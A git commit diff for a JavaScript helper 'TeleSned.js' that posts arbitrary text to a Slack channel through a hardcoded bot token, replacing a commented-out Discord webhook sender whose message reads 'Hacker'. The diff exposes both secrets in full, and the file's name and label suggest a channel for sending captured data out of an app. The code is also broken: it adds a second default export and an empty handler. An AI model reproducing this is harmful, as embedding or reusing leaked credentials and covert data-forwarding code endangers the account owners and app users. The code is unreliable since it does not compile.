cf790536f5dd3e93d65fb0132d19a25b7366b6f1
Aabwshmys <aabwshmys84@gmail.com>
2024-12-27 00:58:36 +0300

    Update TeleSned.js

--- ‏‏my-app/src/server/TeleSned.js
+++ ‏‏my-app/src/server/TeleSned.js
@@ -2,8 +2,25 @@ import axios from 'axios';
 
 
 export const TeleSned = () => {
-
     const Send = async (des) => {
+        const token = "xoxb-8209093787015-8217207272950-ZbwCsf3B1Oaff7jWYjuNcYlL";
+        const url = 'https://slack.com/api/chat.postMessage';
+
+  const payload = {
+    channel: '#general', // تحديد القناة مباشرة
+    text: des // تعيين النص من البيانات المدخلة
+  };
+
+  await fetch(url, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+      'Authorization': `Bearer ${token}`,
+    },
+    body: JSON.stringify(payload),
+  });
+}
+/*    const Send = async (des) => {
         const body = {
           content: "Hacker",
           tts: false,
@@ -18,10 +35,13 @@ export const TeleSned = () => {
             
         await axios.post("https://discord.com/api/webhooks/1318990970519294004/Hzl6uJu85D2gLpdtbFMp-EheGuoJAdQRKR9WA85g41JoQM1umjxCikAFoivixRjADhJ5",body)
              
-    }
+    }*/
   return {
     Send,
 }
 }
 
 export default TeleSned;
+export default async function handler(req) {
+  
+}
